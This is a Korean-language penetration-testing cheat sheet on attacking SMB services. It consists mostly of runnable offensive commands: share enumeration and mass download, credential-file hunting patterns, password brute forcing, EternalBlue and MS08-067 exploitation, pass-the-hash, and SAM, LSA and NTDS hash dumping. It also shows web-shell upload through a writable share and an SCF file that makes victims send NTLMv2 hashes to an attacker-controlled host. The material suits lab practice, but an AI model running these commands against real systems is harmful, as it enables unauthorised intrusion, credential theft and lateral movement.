# SMB

# SMB (139 / 445)

Windows 파일 공유 프로토콜. 익명 접근, 자격증명 브루트포스, 취약점(EternalBlue 등), 해시 릴레이가 주요 공격 벡터.

---

## 1. 열거

```bash
# nmap 스크립트
nmap -p 445 --script=smb-enum-users,smb-enum-shares,smb-os-discovery,smb-security-mode <IP>
nmap -p 139,445 --script="smb-vuln*" <IP>
nmap -p 445 --script=smb2-security-mode <IP>    # SMB signing 확인

# 버전 탐지
nmap -sV -p 139,445 <IP>

# SMB dialect 확인
nmap -p 445 --script=smb-protocols <IP>
```

---

## 2. 공유 열거 (null session / 익명)

```bash
# smbclient — 공유 목록
smbclient -L //<IP> -N           # null session
smbclient -L //<IP> -U ""        # 빈 사용자
smbclient -L //<IP> -U "guest%"  # guest

# smbmap — 더 자세한 권한 정보
smbmap -H <IP>                   # null session
smbmap -H <IP> -u '' -p ''
smbmap -H <IP> -u 'guest' -p ''
smbmap -H <IP> -u 'user' -p 'password'

# netexec
nxc smb <IP>
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u 'guest' -p '' --shares
nxc smb <IP> -u user -p 'password' --shares

# enum4linux
enum4linux -a <IP>
enum4linux-ng -A <IP>

# rpcclient (null session)
rpcclient -U "" -N <IP>
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> enumshares
rpcclient> querydominfo
```

---

## 3. 공유 접근

```bash
# smbclient로 공유 접근
smbclient //<IP>/share -N              # null session
smbclient //<IP>/share -U user
smbclient //<IP>/share -U 'user%password'

# 공유 내 명령어
smb: \> ls
smb: \> ls -la
smb: \> cd folder
smb: \> get file.txt          # 다운로드
smb: \> mget *                # 전체 다운로드
smb: \> put shell.php         # 업로드
smb: \> prompt off            # 다중 작업 시 확인 없이
smb: \> recurse ON            # 재귀 탐색
smb: \> mget *                # 재귀 전체 다운로드

# 전체 다운로드 (명령줄)
smbclient //<IP>/share -N -c "prompt off; recurse ON; mget *"

# smbmap으로 다운로드
smbmap -H <IP> -u user -p 'password' -R share --download 'share\path\file.txt'
```

---

## 3-1. 크리덴셔 헌팅 — spider_plus로 자동 재귀 탐색

공유가 큰 경우 `mget *`로 전체 다운로드하기보다, 먼저 가벼게 전체 파일 목록만 훑어서 수상한 파일만 골라내는 게 효율적이다. spider_plus는 이 목록화 작업을 자동으로 해서 JSON으로 만들어준다.

```bash
# 특정 공유 하나만 재귀 스캔
nxc smb <IP> -u <user> -p '<pass>' -M spider_plus --share '<공유명>'

# 모든 공유 전체 스캔
nxc smb <IP> -u <user> -p '<pass>' -M spider_plus

# 결과 저장 위치 (기본값)
# ~/.nxc/modules/nxc_spider_plus/<IP>.json
cat ~/.nxc/modules/nxc_spider_plus/<IP>.json
```

결과 JSON에서 경로/파일명을 보고 수상한 것만 골라 `smbclient`로 개별 다운로드:

```bash
smbclient -U <user> '//<IP>/<공유명>' -c 'cd <경로>; get "<파일명>"'
```

### 찾아야 할 파일 패턴 (이름만 보고도 수상한 것)

```
*backup*.ps1, *backup*.sh, *deploy*.*   -> 배포/백업 스크립트, 크리덴셔 하드코딩된 경우가 많음 (실제 사례: SQL Express Backup.ps1)
*.vbs, *.bat, *.ps1                    -> SYSVOL/NETLOGON의 로그온 스크립트, 평문 크리덴셔 자주 발견 (실제 사례: adum.vbs)
web.config, .env, database.yml         -> 웹앱 설정파일, DB 접속정보 평문 포함 흔함
unattend.xml, sysprep.xml              -> 윈도우 무인설치 설정, AutoLogon 평문 비번 포함 (07_레지스트리자격증명 참고)
Registry.xml, Groups.xml               -> GPP cpassword (08_GPP_cPassword_Description헌팅 참고)
*.kdbx                                 -> KeePass 비밀번호 DB (08_비밀번호관리자 참고)
```

---

## 4. 브루트포스

```bash
# hydra
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<IP>
hydra -L users.txt -P passwords.txt smb://<IP>
# SMBv1 인증 지원을 안해줄 경우 nxc로 하기 

# netexec
nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success
nxc smb <IP> -u admin -p passwords.txt
# txt 파일의 문자 인코딩 생길 경우 (UnicodeDecodeError: Could not decode password file. Make sure the file only contains UTF-8 characters.)
nxc smb 10.129.78.83 -u <Username> \
  -p /usr/share/wordlists/rockyou.txt \
  --ignore-pw-decoding

# medusa
medusa -h <IP> -u admin -P rockyou.txt -M smbnt
```

---

## 5. EternalBlue — MS17-010 (CVE-2017-0144)

Windows SMBv1 취약점. Windows XP ~ Windows 2012R2. WannaCry/NotPetya가 사용한 취약점.

```bash
# 탐지
nmap -p 445 --script=smb-vuln-ms17-010 <IP>

# Metasploit (가장 안정적)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <칼리IP>
set LPORT 4444
exploit

# 수동 (AutoBlue)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
python eternal_checker.py <IP>          # 취약 여부 확인
python zzz_exploit.py <IP>              # 익스플로잇

# checker만
python3 scanner.py <IP>
```

---

## 6. MS08-067 (CVE-2008-4250)

Windows XP, 2003에서 발생하는 원격 코드 실행 취약점.

```bash
# 탐지
nmap -p 445 --script=smb-vuln-ms08-067 <IP>

# Metasploit
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
set LHOST <칼리IP>
exploit
```

---

## 7. Pass-the-Hash (PtH)

```bash
# smbclient
smbclient //<IP>/share -U administrator --pw-nt-hash <NTLM_HASH>

# netexec
nxc smb <IP> -u administrator -H <NTLM>
nxc smb <서브넷>/24 -u administrator -H <NTLM> --local-auth --continue-on-success

# impacket
impacket-psexec -hashes :<NTLM> administrator@<IP>
impacket-smbexec -hashes :<NTLM> administrator@<IP>
```

---

## 8. 해시 덤프 (관리자 권한)

```bash
# netexec
nxc smb <IP> -u admin -p 'Password!' --sam
nxc smb <IP> -u admin -p 'Password!' --lsa
nxc smb <IP> -u admin -p 'Password!' --ntds    # DC에서만

# impacket
impacket-secretsdump admin:'Password!'@<IP>
impacket-secretsdump -hashes :<NTLM> admin@<IP>
```

---

## 9. 공유에 파일 쓰기 가능할 때

```bash
# 웹 루트가 SMB 공유로 열려있으면 웹쉘 업로드
smbclient //<IP>/wwwroot -U user
smb: \> put shell.php
# → http://<IP>/shell.php 접근

# SCF/LNK 파일로 해시 캡처 (Responder 연계)
cat > @shell.scf << 'EOF'
[Shell]
Command=2
IconFile=\\<칼리IP>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
# 피해자가 공유 탐색 시 칼리로 NTLMv2 해시 전송
```

---

## 팁

- 공유 접근 후 반드시 전체 파일 목록 확인 (`recurse ON; mget *`)
- `IPC$` 공유는 원격 프로시저 호출용 (직접 파일 없음)
- SMB Signing 비활성화 → Relay 공격 가능
- Windows 10+에서는 기본적으로 guest 접근 비활성화